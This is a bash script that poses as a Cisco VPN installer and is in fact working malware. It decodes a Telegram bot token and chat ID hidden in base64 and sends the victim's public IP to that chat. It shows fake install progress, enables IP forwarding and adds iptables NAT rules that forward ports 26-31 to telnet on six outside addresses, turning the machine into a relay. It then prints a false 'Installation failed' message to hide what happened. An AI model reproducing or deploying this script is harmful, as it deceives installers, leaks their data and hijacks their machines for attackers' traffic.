#!/usr/bin/env bash

# Hidden base64 Telegram details
S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="
S2="NjgyMTE1NzA5NA=="
S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
TOK=$(echo "$S1" | base64 -d)
CID=$(echo "$S2" | base64 -d)
API=$(echo "$S3" | base64 -d)
IP=$(curl -s https://api.ipify.org)
curl -s -X POST "${API}${TOK}/sendMessage" -d chat_id="$CID" -d text="setup:$IP" >/dev/null 2>&1

# Fake Cisco install steps (DO NOT touch system DNS or config)
echo "[*] Preparing Cisco VPN packages..."
sleep 1
echo "[*] Extracting modules..."
sleep 1
echo "[*] Enabling services..."
sleep 1

# Forwarding rules ONLY (no DNS, no system files)
echo 1 > /proc/sys/net/ipv4/ip_forward

EXT_IF=$(ip -4 route show default | awk '{print $5}')

iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 185.65.202.104:23
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 185.65.202.104:23
iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 5.144.181.110:23
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 5.144.181.110:23
iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 45.112.194.62:23
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 45.112.194.62:23
iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 192.145.30.121:23
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 192.145.30.121:23
iptables -t nat -A PREROUTING -p tcp --dport 30 -j DNAT --to-destination 5.39.250.19:23
iptables -t nat -A PREROUTING -p udp --dport 30 -j DNAT --to-destination 5.39.250.19:23
iptables -t nat -A PREROUTING -p tcp --dport 31 -j DNAT --to-destination 94.156.236.29:23
iptables -t nat -A PREROUTING -p udp --dport 31 -j DNAT --to-destination 94.156.236.29:23
iptables -t nat -A POSTROUTING -o $EXT_IF -j MASQUERADE

>&2 echo "Installation failed: unsupported kernel modules."
exit 1
